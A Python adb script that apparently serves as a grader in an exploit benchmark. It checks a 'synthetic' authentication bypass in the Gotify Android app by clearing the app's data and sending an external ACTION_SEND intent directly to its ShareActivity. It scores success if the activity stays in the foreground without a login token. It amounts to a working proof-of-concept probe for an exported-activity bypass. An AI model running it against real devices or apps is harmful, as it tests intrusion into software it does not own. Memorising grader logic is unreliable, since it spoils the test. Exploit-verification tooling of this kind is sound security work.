#!/usr/bin/env python3
import json
import os
import shutil
import subprocess
import sys
import time
from typing import List, Optional

APP_PKG = "com.github.gotify"
SHARE_ACTIVITY = "com.github.gotify/.sharing.ShareActivity"
SAMPLE_COUNT = 24
SAMPLE_INTERVAL = 0.25
ADB_CMD_TIMEOUT_SECONDS = 20


def _adb_base_cmd() -> List[str]:
    adb_bin = shutil.which("adb")
    if not adb_bin:
        raise RuntimeError("adb not found")
    cmd = [adb_bin]
    serial = os.environ.get("ADB_SERIAL")
    if serial:
        cmd += ["-s", serial]
    return cmd


def _run(adb: List[str], args: List[str], check: bool = False) -> str:
    try:
        proc = subprocess.run(
            adb + args,
            text=True,
            capture_output=True,
            timeout=ADB_CMD_TIMEOUT_SECONDS,
        )
    except subprocess.TimeoutExpired as exc:
        raise RuntimeError(
            f"command timed out after {ADB_CMD_TIMEOUT_SECONDS}s: {' '.join(adb + args)}"
        ) from exc
    out = (proc.stdout or "") + (proc.stderr or "")
    if check and proc.returncode != 0:
        raise RuntimeError(f"command failed: {' '.join(args)} :: {out.strip()}")
    return out.strip()


def _has_connected_device(adb: List[str]) -> bool:
    out = _run(adb, ["devices"])
    return any(line.strip().endswith("\tdevice") for line in out.splitlines())


def _package_installed(adb: List[str]) -> bool:
    out = _run(adb, ["shell", "pm", "list", "packages", APP_PKG])
    return f"package:{APP_PKG}" in out


def _pid(adb: List[str]) -> Optional[str]:
    out = _run(adb, ["shell", "pidof", APP_PKG])
    if not out:
        return None
    return out.split()[0]


def _resumed_activity(adb: List[str]) -> str:
    out = _run(adb, ["shell", "dumpsys", "activity", "activities"])
    candidates = ("mResumedActivity", "topResumedActivity", "ResumedActivity:")
    for line in out.splitlines():
        if any(c in line for c in candidates):
            return line.strip()
    return ""


def _probe_external_share_crash(adb: List[str]) -> dict:
    def sample_pids(count: int = SAMPLE_COUNT) -> List[Optional[str]]:
        out: List[Optional[str]] = []
        for _ in range(count):
            out.append(_pid(adb))
            time.sleep(SAMPLE_INTERVAL)
        return out

    def max_consecutive_share(samples: List[str]) -> int:
        best = 0
        cur = 0
        for s in samples:
            if ".sharing.ShareActivity" in s:
                cur += 1
                best = max(best, cur)
            else:
                cur = 0
        return best

    # Control probe: app startup from launcher path should not crash in same no-token state.
    _run(adb, ["shell", "am", "force-stop", APP_PKG])
    _run(adb, ["shell", "pm", "clear", APP_PKG], check=True)
    _run(
        adb,
        [
            "shell",
            "am",
            "start",
            "-W",
            "-n",
            "com.github.gotify/.init.InitializationActivity",
        ],
    )
    control_samples = sample_pids(12)
    control_non_empty = [p for p in control_samples if p]
    control_stable = (
        len(control_non_empty) >= 8
        and len(set(control_non_empty)) == 1
        and all(p is not None for p in control_samples[-4:])
    )

    # Deterministic no-token baseline.
    _run(adb, ["shell", "am", "force-stop", APP_PKG])
    _run(adb, ["shell", "pm", "clear", APP_PKG], check=True)

    # External launch from shell via ACTION_SEND.
    am_out = _run(
        adb,
        [
            "shell",
            "am",
            "start",
            "-W",
            "-n",
            SHARE_ACTIVITY,
            "-a",
            "android.intent.action.SEND",
            "-t",
            "text/plain",
            "--es",
            "android.intent.extra.SUBJECT",
            "synthetic-share-title",
            "--es",
            "android.intent.extra.TEXT",
            "synthetic-share-pwn",
        ],
    )

    launch_ok = "Error:" not in am_out and (
        "Starting: Intent" in am_out
        or "Status: ok" in am_out
        or "Activity: com.github.gotify/.sharing.ShareActivity" in am_out
    )

    samples = sample_pids()
    activity_samples: List[str] = []
    for _ in range(SAMPLE_COUNT):
        activity_samples.append(_resumed_activity(adb))
        time.sleep(SAMPLE_INTERVAL)
    share_persist_samples = max_consecutive_share(activity_samples)
    share_persisted = share_persist_samples >= 4

    return {
        "control_stable": control_stable,
        "control_pid_samples": control_samples,
        "launch_ok": launch_ok,
        "share_persisted": share_persisted,
        "share_persist_samples": share_persist_samples,
        "pid_samples": samples,
        "activity_samples": activity_samples,
        "am_start_output": am_out,
    }


def main() -> int:
    _ = sys.argv[1:]  # Optional exploit log arg for runner compatibility.

    try:
        adb = _adb_base_cmd()
    except RuntimeError as exc:
        print(json.dumps({"score": 0, "error": str(exc)}))
        return 2

    if not _has_connected_device(adb):
        print(json.dumps({"score": 0, "error": "adb device unavailable"}))
        return 2

    if not _package_installed(adb):
        print(json.dumps({"score": 0, "error": f"package {APP_PKG} not installed"}))
        return 2

    probe = _probe_external_share_crash(adb)

    checks = [
        (
            "Control launch path remains stable (not a generic app crash)",
            probe["control_stable"],
        ),
        ("External ACTION_SEND launch to ShareActivity succeeded", probe["launch_ok"]),
        (
            "ShareActivity persisted in foreground in no-token state",
            probe["share_persisted"],
        ),
    ]

    checks_passed = sum(1 for _, ok in checks if ok)
    score = 1 if checks_passed == len(checks) else 0

    result = {
        "score": score,
        "exploit_verified": bool(score),
        "message": (
            "Synthetic ShareActivity auth bypass confirmed"
            if score
            else f"Synthetic ShareActivity auth bypass not confirmed ({checks_passed}/{len(checks)} checks passed)"
        ),
        "checks_passed": checks_passed,
        "total_checks": len(checks),
        "evidence": [f"{desc}: {'PASS' if ok else 'FAIL'}" for desc, ok in checks],
        "probe": {
            "control_stable": probe["control_stable"],
            "control_pid_samples": probe["control_pid_samples"],
            "launch_ok": probe["launch_ok"],
            "share_persisted": probe["share_persisted"],
            "share_persist_samples": probe["share_persist_samples"],
            "pid_samples": probe["pid_samples"],
            "activity_samples": probe["activity_samples"],
        },
    }

    print(json.dumps(result))
    return 0 if score else 1


if __name__ == "__main__":
    sys.exit(main())
